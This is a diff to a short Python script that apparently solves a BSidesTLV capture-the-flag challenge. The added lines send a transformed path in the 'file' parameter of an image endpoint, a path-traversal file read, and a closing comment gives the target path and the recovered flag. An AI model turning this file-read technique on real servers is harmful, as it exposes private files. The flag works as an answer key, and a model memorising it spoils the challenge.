@@ -1,3 +1,4 @@
+import requests
 import sys
 
 
@@ -80,7 +81,12 @@ def flip_string(s):
     return ''.join(r)[::-1]
 
 
-print(flip_string(sys.argv[1]))
+flipped = flip_string(sys.argv[1])
+print(flipped)
+
+r = requests.get('http://two.challenges.bsidestlv.com:3333/img?file=' + flipped)
+print(r.status_code)
+print(r.text)
 
 # /home/bsidestlv/flag.txt
 # ..home/bsidestlv/flag.txt --> BSidesTLV{I_Like_FlipFlops_And_I_Cannot_Lie}
